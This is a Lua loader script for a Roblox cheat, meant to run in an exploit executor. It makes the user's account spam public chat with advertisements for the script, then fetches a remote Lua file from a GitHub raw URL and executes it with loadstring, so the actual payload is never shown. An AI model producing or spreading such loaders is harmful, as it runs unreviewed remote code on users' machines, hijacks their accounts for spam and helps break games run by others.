-- This file was created by 0x1Ez "discord"

local t1 = {
	"VIeW StaR by 0x1Ez //USER: " .. game:GetService("Players").LocalPlayer.Name,
	"FE SCRIPT FOR R6 ONLY USE IT AND FARM AURA ",
	"GUYS USE HIGH GRAPHICS FOR BETTER EXPERIENCE",
	"//WORKS IN every eXeCutOOR \\",
	"SCriPt By 0x1Ez V1 WrokiNg!"
}

local function v2(p1)
	local TextChatService = game:GetService("TextChatService")
	local v4

	if TextChatService then
		v4 = TextChatService.ChatVersion == Enum.ChatVersion.TextChatService
	else
		v4 = TextChatService
	end

	local RBXGeneral = v4 and TextChatService.TextChannels:FindFirstChild("RBXGeneral")

	if RBXGeneral then
		RBXGeneral:SendAsync(p1)

		return
	end

	local DefaultChatSystemChatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")

	if not DefaultChatSystemChatEvents then
		return
	end

	local SayMessageRequest = DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
	local isRemoteEvent

	if SayMessageRequest then
		isRemoteEvent = SayMessageRequest:IsA("RemoteEvent")
	else
		isRemoteEvent = SayMessageRequest
	end

	if not isRemoteEvent then
		return
	end

	SayMessageRequest:FireServer(p1, "All")
end

task.spawn(function()
	for _, v in ipairs(t1) do
		v2(v)
		task.wait(1.25)
	end

	local ok, result = pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/MANASMCPE/Last-Star/refs/heads/main/Last%E2%98%85Star.lua.txt"))()
	end)

	if ok then
		return
	end

	warn("Failed to execute external script: " .. tostring(result))
end)
